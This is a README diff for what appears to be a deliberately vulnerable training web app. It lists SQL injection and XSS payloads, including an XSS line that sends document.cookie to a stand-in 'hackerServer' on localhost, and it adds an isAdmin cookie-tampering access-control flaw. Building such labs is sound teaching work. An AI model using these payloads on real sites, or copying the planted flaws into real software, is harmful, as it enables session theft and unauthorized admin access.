@@ -37,6 +37,7 @@ If you want to test SQli you need to create **postgresql** database with that cr
 | SQli | admin' -- | Password field | Allow to login only by username |
 | XSS | \<svg onload=alert(1)> | PostInfo field | Simple alert |
 | XSS | \<svg onload='var i = new Image(); i.src="http://localhost:3001/acceptCookie?cookie="+btoa(document.cookie);'> | PostInfo field | Allow to send user cookie to **hackerServer** website |
+| Broken Access Control | Any logged in user can edit **isAdmin** cookie parameter | DevTools Application Cookie | Get access to admin page |
 
 ---
 
@@ -44,6 +45,6 @@ If you want to test SQli you need to create **postgresql** database with that cr
 
 *   [x] SQli vuln.
 *   [x] XSS vuln.
-*   [ ] Broken Access Control vuln.
+*   [x] Broken Access Control vuln.
 *   [ ] CSRF vuln.
 *   [ ] SSRF vuln.
